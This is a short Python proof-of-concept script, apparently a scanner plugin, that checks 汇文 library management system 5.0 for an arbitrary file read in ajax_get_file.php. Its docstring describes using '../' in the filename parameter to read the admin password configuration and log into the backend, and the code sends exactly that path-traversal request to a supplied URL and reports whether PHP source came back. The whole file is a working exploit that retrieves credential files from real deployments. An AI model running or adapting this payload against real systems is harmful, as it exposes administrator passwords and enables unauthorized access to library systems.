#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_get_file.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2010-0116255
author: Lucifer
description: 漏洞影响5.0版本,漏洞文件位于ajax_get_file.php中,参数filename可以传入"../"来读取配置文件，并成功登陆到后台。'''
import sys
import requests
import warnings
def run(url):
        result = ['汇文软件图书管理系统ajax_get_file.php任意文件读取','','']
        payload = "/opac/ajax_get_file.php?filename=../admin/opacadminpwd.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"<?php" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
